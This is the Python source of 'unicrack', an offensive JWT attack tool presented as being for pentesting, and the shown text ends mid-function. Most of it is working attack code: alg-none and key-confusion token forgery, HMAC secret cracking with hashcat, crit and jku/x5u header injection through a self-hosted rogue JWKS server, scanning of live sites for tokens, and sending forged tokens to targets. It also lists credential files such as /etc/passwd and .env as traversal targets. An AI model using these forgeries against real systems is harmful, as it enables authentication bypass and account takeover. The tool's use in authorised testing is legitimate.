#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
unicrack – Swiss-army-knife for JWT research & exploitation

Author : Mon3m
Enhanced for professional pentesting
"""

from __future__ import annotations

# ────────────────────────────  STANDARD / 3RD-PARTY  ────────────────────
import argparse
import base64
import concurrent.futures as cf
import hashlib
import hmac
import json
import logging
import os
import re
import requests
import subprocess
import sys
import tempfile
import textwrap
import time
import uuid
from contextlib import contextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Set
import urllib.parse

import http.server
import socket
import ssl
import threading

import jwt                       #  PyJWT ≥2.7 (supports EdDSA & ES256K)
import typer                     #  Typer (Click wrapper)
from colorama import init as _cinit
from rich import box
from rich.console import Console
from rich.logging import RichHandler
from rich.progress import BarColumn, Progress, TimeElapsedColumn
from rich.table import Table
from rich.syntax import Syntax
from rich.panel import Panel

# extra deps for some attacks and functionality
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from cryptography.x509.oid import NameOID
import datetime

# For web scanning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
_cinit(autoreset=True)

# ─────────────────────────── LOGGING SETUP ────────────────────────────
# Set up logging with rich handler
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)
logger = logging.getLogger("unicrack")

# ──────────────────────────────  Typer APP  ─────────────────────────────
app = typer.Typer(
    add_completion=False,
    invoke_without_command=True,
    help="""[bold]unicrack[/bold] – Professional JWT security testing tool.

SAFE commands (read-only):
   decode scan

ACTIVE commands (forge / network / cracking):
   none crack confuse jku duplicate crit sign
   kid traversal jwkskey jkuadv nested nestednone weakkey jwkrewrite
   confuseadv audbypass issuer critconfuse typoclaim jwemix nbf replay
   algtypo zipdef nestmix

ADVANCED commands:
   proxy bruteheaders fuzz report

Every ACTIVE command needs the explicit flag  [bold]--active[/bold] .
""",
)
console = Console()

# ───────────────────────────  START-UP BANNER  ──────────────────────────
_LOGO = r"""
██╗   ██╗███╗   ██╗██╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██║   ██║████╗  ██║██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██║   ██║██╔██╗ ██║██║██║     ██████╔╝███████║██║     █████╔╝ 
██║   ██║██║╚██╗██║██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
╚██████╔╝██║ ╚████║██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

def show_banner() -> None:
    for line in _LOGO.splitlines():
        console.print(line, style="bold cyan", justify="center")
    console.print("[italic dim]Pentesting Edition[/italic dim]", justify="center")
    console.print()

# ──────────────────────────────  CONSTANTS  ─────────────────────────────
Json  = Dict[str, Any]
Parts = Tuple[Json, Json, str]
CPU_COUNT = os.cpu_count() or 2
__VERSION__ = "3.1.0"   # Enhanced version

ALG_RS_ES_PS = re.compile(r"^(RS|ES|PS)\d+$", re.I)
HS_DIGEST = {"HS256": hashlib.sha256,
             "HS384": hashlib.sha384,
             "HS512": hashlib.sha512}

# Common JWT claims for scanning
COMMON_CLAIMS = ["sub", "iss", "aud", "exp", "nbf", "iat", "jti"]

# Common paths for directory traversal attacks
COMMON_PATHS = [
    "keys/private.key", "keys/secret.pem", "keys/jwt.key", 
    "config/jwt.key", "app/config/jwt.key", ".env", 
    "secrets/jwt_secret", "config.json", "settings.json",
    "/etc/passwd", "/proc/self/environ", "../../.env",
    "../../../app/config/secrets.json"
]

# Session store for managing attack state
class AttackSession:
    def __init__(self):
        self.id = str(uuid.uuid4())[:8]
        self.created = datetime.datetime.now()
        self.tokens = {}  # original_token -> list of forged tokens
        self.findings = []  # list of findings
        self.target_url = None
        self.headers = {}
        self.cookies = {}
    
    def add_token(self, original, forged, attack_type=None):
        if original not in self.tokens:
            self.tokens[original] = []
        self.tokens[original].append({
            'token': forged, 
            'attack': attack_type, 
            'timestamp': datetime.datetime.now()
        })
    
    def add_finding(self, title, description, severity, token=None, details=None):
        self.findings.append({
            'title': title,
            'description': description,
            'severity': severity,  # 'Critical', 'High', 'Medium', 'Low', 'Info'
            'token': token,
            'details': details or {},
            'timestamp': datetime.datetime.now()
        })

# Initialize global session
current_session = AttackSession()

# ────────────────────────────  HELPERS / MISC  ─────────────────────────
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def b64url_decode(b64: str) -> bytes:
    b64 += "=" * (-len(b64) % 4)
    return base64.urlsafe_b64decode(b64)

def pretty_error(msg: str) -> None:
    console.print(f"[bold red]Error:[/bold red] {msg}")
    raise typer.Exit(1)

@contextmanager
def timing(label: str) -> None:
    t0 = time.perf_counter()
    console.status(f"[cyan]{label} …[/cyan]")
    yield
    console.log(f"[green]{label} finished in {time.perf_counter()-t0:0.2f}s[/green]")

def parse_jwt(token: str) -> Parts:
    try:
        header: Json = jwt.get_unverified_header(token)
        payload: Json = jwt.decode(token, options={"verify_signature": False})
    except (jwt.DecodeError, jwt.InvalidTokenError) as exc:
        raise ValueError(f"JWT decode failed – {exc}") from exc
    sig = token.split(".", 2)[-1] if token.count(".") == 2 else ""
    return header, payload, sig

def pretty_print(header: Json, payload: Json, sig: str) -> None:
    tbl = Table(title="JWT details", box=box.MINIMAL_DOUBLE_HEAD)
    tbl.add_column("Part", style="cyan", no_wrap=True)
    tbl.add_column("Value", style="magenta")
    tbl.add_row("Header", json.dumps(header, indent=2))
    tbl.add_row("Payload", json.dumps(payload, indent=2))
    tbl.add_row("Signature", sig or "<detached / none>")
    console.print(tbl)

def validate_token(tok: str) -> str:
    try: parse_jwt(tok)
    except ValueError as e: pretty_error(str(e))
    return tok

def save_output_to_file(content: str, prefix: str = "attack", extension: str = "txt") -> Path:
    """Save output to a timestamped file in the output directory"""
    output_dir = Path("unicrack_output")
    output_dir.mkdir(exist_ok=True)
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{prefix}_{timestamp}.{extension}"
    file_path = output_dir / filename
    
    with open(file_path, 'w') as f:
        f.write(content)
    
    console.print(f"[green]Output saved to:[/green] {file_path}")
    return file_path

def generate_random_secret(length: int = 32) -> str:
    """Generate a cryptographically secure random secret"""
    return os.urandom(length).hex()

# ────────────────────────────  KEY GENERATION  ────────────────────────────
def generate_rsa_key(bits: int = 2048) -> Tuple[bytes, bytes]:
    """Generate RSA key pair and return (private_key_pem, public_key_pem)"""
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=bits,
        backend=default_backend()
    )
    
    private_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_pem = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    return private_pem, public_pem

def generate_ec_key(curve: str = "secp256r1") -> Tuple[bytes, bytes]:
    """Generate EC key pair and return (private_key_pem, public_key_pem)"""
    curve_map = {
        "secp256r1": ec.SECP256R1(),
        "secp384r1": ec.SECP384R1(),
        "secp521r1": ec.SECP521R1(),
    }
    
    key = ec.generate_private_key(
        curve=curve_map.get(curve, ec.SECP256R1()),
        backend=default_backend()
    )
    
    private_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_pem = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    return private_pem, public_pem

def generate_ed25519_key() -> Tuple[bytes, bytes]:
    """Generate Ed25519 key pair and return (private_key_pem, public_key_pem)"""
    private_key = ed25519.Ed25519PrivateKey.generate()
    
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    return private_pem, public_pem

# ───────────────────────────────  FORGERS  ─────────────────────────────
def forge_none(hdr: Json, pl: Json) -> str:
    hdr2 = {**hdr, "alg": "none"}
    token = f"{b64url_encode(json.dumps(hdr2).encode())}."\
            f"{b64url_encode(json.dumps(pl).encode())}."
    current_session.add_token(None, token, "alg-none")
    return token

def forge_hs(hdr: Json, pl: Json, secret: str, alg: str="HS256") -> str:
    if alg not in HS_DIGEST: raise ValueError("Unsupported HS alg")
    hdr2  = {**hdr, "alg": alg}
    h_b64 = b64url_encode(json.dumps(hdr2).encode())
    p_b64 = b64url_encode(json.dumps(pl).encode())
    sig   = b64url_encode(hmac.new(secret.encode(),
                                   f"{h_b64}.{p_b64}".encode(),
                                   HS_DIGEST[alg]).digest())
    token = f"{h_b64}.{p_b64}.{sig}"
    current_session.add_token(None, token, f"forge-{alg}")
    return token

def forge_with_key(hdr: Json, pl: Json, key_file: Path, alg: str) -> str:
    """Forge a token with the specified algorithm and key file"""
    try:
        key_data = key_file.read_bytes()
        hdr2 = {**hdr, "alg": alg}
        token = jwt.encode(pl, key_data, algorithm=alg, headers=hdr2)
        current_session.add_token(None, token, f"forge-{alg}")
        return token
    except Exception as e:
        pretty_error(f"Signing failed: {e}")

# ─────────────────────────  HSx BRUTE-FORCE  ────────────────────────────
def _hs_worker(word: bytes, signing_input: bytes, target: str, alg: str) -> Optional[str]:
    sig = b64url_encode(hmac.new(word, signing_input, HS_DIGEST[alg]).digest())
    return word.decode() if sig == target else None

def hs_bruteforce(token: str, wordlist: Path, jobs: int, gpu: bool=False) -> Optional[str]:
    header, _, signature = parse_jwt(token)
    alg = header.get("alg", "HS256").upper()
    if alg not in HS_DIGEST: pretty_error("Token alg is not HS256/384/512")
    signing_input = token.rsplit(".", 1)[0].encode()

    # GPU via hashcat (HS256 only)
    if gpu and alg == "HS256":
        return _hashcat(token, wordlist, alg)
    if gpu and alg != "HS256":console.print("[yellow]GPU only for HS256 – falling back to CPU[/yellow]")

    try: total = sum(1 for _ in wordlist.open("rb"))
    except OSError: total = None
    with Progress("[progress.description]{task.description}", BarColumn(),
                  "{task.completed}"+("/"+str(total) if total else ""),
                  TimeElapsedColumn(), console=console) as prog, \
         wordlist.open("rb") as fh, timing("CPU brute-force"):
        t = prog.add_task("Cracking", total=total)
        with cf.ProcessPoolExecutor(max_workers=jobs) as ex:
            futs = {ex.submit(_hs_worker, line.strip(), signing_input,
                              signature, alg): None
                    for line in fh if line.strip()}
            for f in cf.as_completed(futs):
                prog.update(t, advance=1)
                res = f.result()
                if res:
                    console.print(f"[bold green]Secret found → {res}[/bold green]")
                    # Add finding to session
                    current_session.add_finding(
                        title="JWT Secret Cracked", 
                        description=f"Successfully cracked JWT secret for algorithm {alg}",
                        severity="Critical",
                        token=token,
                        details={"secret": res, "algorithm": alg}
                    )
                    ex.shutdown(cancel_futures=True)
                    return res
    console.print("[red]Secret NOT found[/red]")
    return None

def _hashcat(token: str, wordlist: Path, alg: str) -> Optional[str]:
    mode = "16500"                  # HS256
    signing_input = token.rsplit(".", 1)[0]
    digest = b64url_encode(HS_DIGEST[alg](signing_input.encode()).digest())
    sig    = token.split(".")[2]
    pot    = Path(os.environ.get("HASHCAT_POTFILE_PATH",
                                 Path.home()/".hashcat"/"hashcat.potfile"))
    with tempfile.NamedTemporaryFile("w", delete=False) as tmp:
        tmp.write(f"{sig}:{digest}"); tmp_path = tmp.name
    
    # Use more optimized hashcat parameters for real pentests
    cmd = ["hashcat", "-a", "0", "-m", mode, tmp_path, str(wordlist), 
           "--quiet", "-w", "4", "--force"]
    
    console.print("[cyan]Off-loading to hashcat …[/cyan]")
    try: 
        # Capture output for better feedback
        process = subprocess.run(
            cmd, 
            check=True,
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        if process.stdout:
            console.print(f"[dim]{process.stdout.strip()}[/dim]")
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Hashcat error: {e.stderr if e.stderr else 'Unknown error'}[/red]")
        return None
    except FileNotFoundError:
        console.print("[red]Hashcat not found in PATH[/red]")
        return None
    
    # Try to get result from stdout first (faster)
    if process.stdout and ":" in process.stdout:
        for line in process.stdout.splitlines():
            if ":" in line and sig in line:
                secret = line.strip().split(":", 2)[-1]
                current_session.add_finding(
                    title="JWT Secret Cracked (GPU)", 
                    description=f"Successfully cracked JWT secret using GPU acceleration",
                    severity="Critical",
                    token=token,
                    details={"secret": secret, "algorithm": alg}
                )
                return secret
                
    # Fall back to potfile
    if not pot.exists(): return None
    with pot.open() as fh:
        for line in fh:
            if sig in line: 
                secret = line.strip().split(":", 2)[-1]
                current_session.add_finding(
                    title="JWT Secret Cracked (GPU)", 
                    description=f"Successfully cracked JWT secret using GPU acceleration",
                    severity="Critical",
                    token=token,
                    details={"secret": secret, "algorithm": alg}
                )
                return secret
    return None

# ─────────────────────── TOKEN SCANNING & ANALYSIS ─────────────────────────
def analyze_token(token: str) -> Dict[str, Any]:
    """Perform deep analysis of a token to identify potential weaknesses"""
    try:
        header, payload, sig = parse_jwt(token)
        
        results = {
            "header": header,
            "payload": payload,
            "signature_present": bool(sig.strip()),
            "issues": [],
            "risk_score": 0,  # 0-100 scale
            "algorithm": header.get("alg", "unknown"),
        }
        
        # Check for 'none' algorithm
        if header.get("alg", "").lower() == "none":
            results["issues"].append({
                "severity": "Critical",
                "description": "Token uses 'none' algorithm",
                "impact": "Authentication bypass possible"
            })
            results["risk_score"] += 40
        
        # Check for weak HMAC algorithms
        if header.get("alg", "").upper() in ["HS256"]:
            results["issues"].append({
                "severity": "Medium",
                "description": "Token uses HS256 which is potentially vulnerable to brute force",
                "impact": "Secret may be crackable with sufficient resources"
            })
            results["risk_score"] += 20
        
        # Check for absence of required claims
        for claim in ["exp", "nbf", "iat"]:
            if claim not in payload:
                results["issues"].append({
                    "severity": "Medium" if claim == "exp" else "Low",
                    "description": f"Missing {claim} claim",
                    "impact": "Token may not expire properly" if claim == "exp" else 
                             "Reduced security controls"
                })
                results["risk_score"] += 10 if claim == "exp" else 5
        
        # Check for KID header parameter (potential for injection)
        if "kid" in header:
            results["issues"].append({
                "severity": "Low",
                "description": "Token uses 'kid' header which may be vulnerable to injection",
                "impact": "Possible directory traversal or SQL injection"
            })
            results["risk_score"] += 15
        
        # Check for abnormally long expiration
        if "exp" in payload and "iat" in payload:
            duration = payload["exp"] - payload["iat"]
            # More than 24 hours
            if duration > 86400:
                days = duration / 86400
                results["issues"].append({
                    "severity": "Medium" if days > 30 else "Low",
                    "description": f"Long-lived token (approximately {days:.1f} days)",
                    "impact": "Extended window of opportunity if token is compromised"
                })
                results["risk_score"] += min(int(days), 25)
        
        # Calculate final risk rating
        if results["risk_score"] >= 70:
            results["risk_rating"] = "Critical"
        elif results["risk_score"] >= 40:
            results["risk_rating"] = "High"
        elif results["risk_score"] >= 20:
            results["risk_rating"] = "Medium"
        elif results["risk_score"] > 0:
            results["risk_rating"] = "Low"
        else:
            results["risk_rating"] = "Informational"
            
        return results
    
    except Exception as e:
        logger.error(f"Error analyzing token: {e}")
        return {"error": str(e)}

# ───────────────────────────── BASE ATTACKS  ────────────────────────────
def key_confusion(token: str, custom_pubkey: Optional[str] = None) -> Optional[str]:
    """
    RS/ES/PS -> HS key confusion attack
    Uses a provided public key or generates a new one
    """
    hdr, pl, _ = parse_jwt(token)
    alg = str(hdr.get("alg", ""))
    if not ALG_RS_ES_PS.match(alg):
        console.print("[yellow]Token is not RS/ES/PS – skipping[/yellow]")
        return None
    
    # Generate or use provided pubkey
    if custom_pubkey:
        pubkey = custom_pubkey
    else:
        # Generate a real RSA key for the attack
        _, pubkey_bytes = generate_rsa_key()
        pubkey = pubkey_bytes.decode('utf-8')
    
    forged = forge_hs(hdr, pl, pubkey, alg="HS256")
    
    # Add finding to session
    current_session.add_finding(
        title="Key Confusion Attack", 
        description="Successfully executed key confusion attack (RS/ES/PS → HS)",
        severity="Critical",
        token=token,
        details={"original_alg": alg, "forged_token": forged}
    )
    
    console.print("[green]Forged token (pubkey as HMAC secret):[/green]")
    console.print(forged)
    return forged

def duplicate_claim(hdr: Json, pl: Json, claim: str="exp") -> str:
    """Create duplicate claim with different name to confuse validation"""
    new_pl = pl.copy(); new_pl[f"{claim}2"] = 0
    token = forge_none(hdr, new_pl)
    
    current_session.add_finding(
        title="Duplicate Claim Attack", 
        description=f"Successfully created token with duplicate claim ({claim})",
        severity="Medium",
        token=token,
        details={"claim": claim, "duplicate_name": f"{claim}2"}
    )
    
    return token

def crit_header(hdr: Json, pl: Json) -> str:
    """Inject critical header parameter to bypass validation"""
    hdr2 = {**hdr, "crit": ["evil"], "evil": True, "alg": "none"}
    token = forge_none(hdr2, pl)
    
    current_session.add_finding(
        title="Critical Header Injection", 
        description="Successfully created token with malicious crit header",
        severity="High",
        token=token,
        details={"crit_values": ["evil"]}
    )
    
    return token

# ───────────────────────────  JWKS MINI-SERVER (SAFE)  ──────────────────────
# Create a proper JWKS key with appropriate metadata
def generate_jwks_key(kid: str = None, key_type: str = "oct") -> str:
    """Generate a proper JWKS document with specified key type"""
    if kid is None:
        kid = f"attack-key-{os.urandom(4).hex()}"
    
    if key_type == "oct":
        # Symmetric key (oct)
        random_key = os.urandom(32)
        jwk = {
            "kty": "oct",
            "kid": kid,
            "k": b64url_encode(random_key),
            "alg": "HS256",
            "use": "sig"
        }
    elif key_type == "RSA":
        # RSA key pair
        priv_key, pub_key = generate_rsa_key()
        key = serialization.load_pem_private_key(
            priv_key, 
            password=None,
            backend=default_backend()
        )
        nums = key.public_key().public_numbers()
        n = b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,"big"))
        e = b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,"big"))
        jwk = {
            "kty": "RSA",
            "kid": kid,
            "n": n,
            "e": e,
            "alg": "RS256",
            "use": "sig"
        }
    elif key_type == "EC":
        # EC key pair
        priv_key, pub_key = generate_ec_key()
        # We'd need additional processing to extract proper EC params
        # This is simplified
        jwk = {
            "kty": "EC",
            "kid": kid,
            "crv": "P-256",
            "alg": "ES256",
            "use": "sig",
            # EC-specific parameters would go here
        }
    else:
        jwk = {
            "kty": "oct",
            "kid": kid,
            "k": b64url_encode(os.urandom(32)),
            "alg": "HS256",
            "use": "sig"
        }
    
    return json.dumps({"keys": [jwk]})

# Global for JWKS content
JWKS_JSON = generate_jwks_key()

class _JWKSHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):                                  # type: ignore
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(JWKS_JSON)))
        self.end_headers(); self.wfile.write(JWKS_JSON.encode())
    
    def do_POST(self):  # Support POST requests for more realistic testing
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(JWKS_JSON)))
        self.end_headers(); self.wfile.write(JWKS_JSON.encode())
    
    def log_message(self, *_): pass

# Generate temporary self-signed certificate for HTTPS
def generate_self_signed_cert():
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Testing"),
        x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
    ])
    
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=10)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName("localhost")]),
        critical=False,
    ).sign(key, hashes.SHA256())
    
    # Create temporary files for cert and key
    cert_path = tempfile.NamedTemporaryFile(delete=False, suffix='.crt')
    key_path = tempfile.NamedTemporaryFile(delete=False, suffix='.key')
    
    cert_path.write(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ))
    
    cert_path.close()
    key_path.close()
    
    return cert_path.name, key_path.name

def _serve_jwks(https: bool=False, bind_addr: str="127.0.0.1") -> str:
    """Start JWKS server and return URL. Can bind to public addresses for real pentests."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((bind_addr, 0))  # Allow binding to public interfaces
    port = sock.getsockname()[1]
    sock.close()
    
    srv = http.server.HTTPServer((bind_addr, port), _JWKSHandler)
    if https:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # Generate certificate and key on the fly
        cert_file, key_file = generate_self_signed_cert()
        ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        
        # Clean up temporary files when done
        def cleanup():
            if os.path.exists(cert_file):
                os.unlink(cert_file)
            if os.path.exists(key_file):
                os.unlink(key_file)
        
        # Register cleanup on process exit
        import atexit
        atexit.register(cleanup)
    
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    console.print(f"[cyan]JWKS server running on {bind_addr}:{port}[/cyan]")
    return f"{'https' if https else 'http'}://{bind_addr}:{port}/jwks.json"

def jku_inject(hdr: Json, pl: Json, which: str="both", bind_addr: str="127.0.0.1", https: bool=False) -> List[str]:
    """
    Inject jku/x5u headers that point to attacker-controlled JWKS server
    Can be configured for public addresses in real pentests
    """
    url = _serve_jwks(https=https, bind_addr=bind_addr)
    fields = ("jku","x5u") if which=="both" else (which,)
    forged=[]
    
    for fld in fields:
        hdr2 = {**hdr, fld:url, "alg":"none"}
        token = forge_none(hdr2,pl)
        forged.append(token)
        
        current_session.add_finding(
            title=f"{fld.upper()} Header Injection", 
            description=f"Successfully created token with {fld} pointing to attacker JWKS",
            severity="High",
            token=token,
            details={"url": url, "header": fld}
        )
        
        console.print(f"[green]Forged token with {fld} → {url}[/green]")
    
    console.print("[cyan](JWKS server running in background)[/cyan]")
    return forged

# ───────────────────────── WEB ATTACK UTILITIES ─────────────────────────
def extract_tokens_from_request(request_data: str) -> List[str]:
    """Extract potential JWT tokens from HTTP request data"""
    # Common JWT locations
    jwt_pattern = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
    tokens = jwt_pattern.findall(request_data)
    
    # Also look for potential tokens in authorization headers
    auth_pattern = re.compile(r'(Authorization|Bearer):?\s+([^\r\n]+)', re.IGNORECASE)
    for match in auth_pattern.finditer(request_data):
        header_val = match.group(2).strip()
        # Check if it's a JWT
        if header_val.startswith('Bearer '):
            header_val = header_val[7:]
        if jwt_pattern.match(header_val):
            tokens.append(header_val)
    
    # Return unique tokens
    return list(set(tokens))

def scan_website_for_tokens(url: str, cookies: Dict[str, str] = None, headers: Dict[str, str] = None) -> List[str]:
    """
    Scan a website for JWT tokens in responses, headers, and cookies
    Returns list of found tokens
    """
    found_tokens = []
    
    try:
        # Store target info in session
        current_session.target_url = url
        if cookies:
            current_session.cookies = cookies
        if headers:
            current_session.headers = headers
            
        # Make the request with proper error handling and timeout
        response = requests.get(
            url, 
            cookies=cookies, 
            headers=headers, 
            timeout=10,
            verify=False  # Allow self-signed certs for pentesting
        )
        
        # Check Authorization header
        auth_header = response.headers.get('Authorization', '')
        if 'Bearer ' in auth_header:
            token = auth_header.split('Bearer ')[1].strip()
            if token.count('.') == 2:  # Simple validation
                found_tokens.append(token)
                console.print(f"[green]Found token in Authorization header[/green]")
        
        # Check Set-Cookie headers for tokens
        for cookie_name, cookie_value in response.cookies.items():
            if cookie_value.count('.') == 2 and cookie_value.startswith('eyJ'):
                found_tokens.append(cookie_value)
                console.print(f"[green]Found token in {cookie_name} cookie[/green]")
        
        # Check response body
        jwt_pattern = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
        body_tokens = jwt_pattern.findall(response.text)
        for token in body_tokens:
            # Validate as JWT
            try:
                parse_jwt(token)
                found_tokens.append(token)
                console.print(f"[green]Found token in response body[/green]")
            except:
                pass  # Not a valid JWT
                
        # Check for common JWT-related JavaScript patterns
        js_patterns = [
            r'localStorage\.setItem\([\'"](?:token|jwt|accessToken)[\'"],\s*[\'"]([^\'"]+)[\'"]',
            r'sessionStorage\.setItem\([\'"](?:token|jwt|accessToken)[\'"],\s*[\'"]([^\'"]+)[\'"]',
            r'(?:token|jwt|accessToken):\s*[\'"]([^\'"]+)[\'"]',
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, response.text)
            for match in matches:
                if match.count('.') == 2 and match.startswith('eyJ'):
                    try:
                        parse_jwt(match)
                        found_tokens.append(match)
                        console.print(f"[green]Found token in JavaScript code[/green]")
                    except:
                        pass
        
        # Return unique tokens
        return list(set(found_tokens))
        
    except requests.RequestException as e:
        console.print(f"[red]Error scanning website: {e}[/red]")
        return []

def send_token_request(url: str, token: str, location: str = "header", 
                      additional_headers: Dict[str, str] = None,
                      method: str = "GET") -> requests.Response:
    """
    Send a request using the specified token
    Location can be: header, cookie, query, body
    """
    headers = additional_headers or {}
    cookies = {}
    params = {}
    json_data = {}
    
    if location == "header":
        headers["Authorization"] = f"Bearer {token}"
    elif location == "cookie":
        cookies["jwt"] = token
    elif location == "query":
        params["token"] = token
    elif location == "body":
        json_data["token"] = token
    
    try:
        if method.upper() == "GET":
            response = requests.get(url, headers=headers, cookies=cookies, 
                                   params=params, timeout=10, verify=False)
        elif method.upper() == "POST":
            response = requests.post(url, headers=headers, cookies=cookies,
                                    params=params, json=json_data, timeout=10, verify=False)
        else:
            console.print(f"[red]Unsupported method: {method}[/red]")
            return None
            
        return response
    
    except requests.RequestException as e:
        console.print(f"[red]Error sending request: {e}[/red]")
        return None

# ─────────────────────────────  CLI  – SAFE  ────────────────────────────
@app.command(help="Decode / pretty-print a JWT (read-only).")
def decode(token: str = typer.Option(..., "-t", "--token", callback=validate_token),
           output: str = typer.Option("table","-o","--output",
                                      help="[table] (default) | json | raw"),
           analyze: bool = typer.Option(False, "--analyze", help="Perform security analysis")):
    hdr, pl, sig = parse_jwt(token)
    
    if analyze:
        # Perform security analysis
        results = analyze_token(token)
        
        # Print analysis results
        console.print(Panel(f"[bold]Security Analysis for JWT[/bold]", style="cyan"))
        
        console.print(f"[bold]Risk Rating:[/bold] [{'red' if results['risk_rating'] in ('Critical', 'High') else 'yellow' if results['risk_rating'] == 'Medium' else 'green'}]{results['risk_rating']}[/{'red' if results['risk_rating'] in ('Critical', 'High') else 'yellow' if results['risk_rating'] == 'Medium' else 'green'}]")
        console.print(f"[bold]Risk Score:[/bold] {results['risk_score']}/100")
        console.print(f"[bold]Algorithm:[/bold] {results['algorithm']}")
        
        if results["issues"]:
            issue_table = Table(title="Security Issues", box=box.SIMPLE_HEAVY)
            issue_table.add_column("Severity", style="bold")
            issue_table.add_column("Description")
            issue_table.add_column("Impact")
            
            for issue in results["issues"]:
                severity_color = "red" if issue["severity"] == "Critical" else \
                              "orange3" if issue["severity"] == "High" else \
                              "yellow" if issue["severity"] == "Medium" else \
                              "green"
                issue_table.add_row(
                    f"[{severity_color}]{issue['severity']}[/{severity_color}]",
                    issue["description"],
                    issue["impact"]
                )
            
            console.print(issue_table)
        else:
            console.print("[green]No security issues detected[/green]")
    
    if output=="json":
        console.print(json.dumps({"header":hdr,"payload":pl,
                                  "signature":sig,"version":__VERSION__},indent=2))
    elif output=="raw":
        console.print(json.dumps(hdr, indent=2))
        console.print(json.dumps(pl, indent=2))
    else:
        pretty_print(hdr,pl,sig)

@app.command(help="Scan a website for JWT tokens and analyze them")
def scan(url: str = typer.Option(..., "--url"),
         cookie: List[str] = typer.Option(None, "--cookie", "-c", help="Cookie in format name=value"),
         header: List[str] = typer.Option(None, "--header", "-H", help="Header in format name:value"),
         analyze: bool = typer.Option(True, "--analyze/--no-analyze", help="Analyze found tokens"),
         output_file: bool = typer.Option(False, "--output-file", help="Save scan results to file")):
    """
    Scan a website for JWT tokens and analyze them for security issues
    """
    # Parse cookies and headers
    cookies = {}
    headers = {"User-Agent": "unicrack-scanner/3.1.0"}
    
    for c in cookie or []:
        if "=" in c:
            name, value = c.split("=", 1)
            cookies[name.strip()] = value.strip()
    
    for h in header or []:
        if ":" in h:
            name, value = h.split(":", 1)
            headers[name.strip()] = value.strip()
    
    console.print(f"[cyan]Scanning {url} for JWT tokens...[/cyan]")
    found_tokens = scan_website_for_tokens(url, cookies, headers)
    
    if not found_tokens:
        console.print("[yellow]No JWT tokens found[/yellow]")
        return
    
    console.print(f"[green]Found {len(found_tokens)} token(s)[/green]")
    
    scan_results = []
    
    for i, token in enumerate(found_tokens, 1):
        console.print(f"\n[bold cyan]Token #{i}:[/bold cyan]")
        try:
            hdr, pl, sig = parse_jwt(token)
            pretty_print(hdr, pl, sig)
            
            if analyze:
                analysis = analyze_token(token)
                scan_results.append({
                    "token": token,
                    "header": hdr,
                    "payload": pl,
                    "analysis": analysis
                })
                
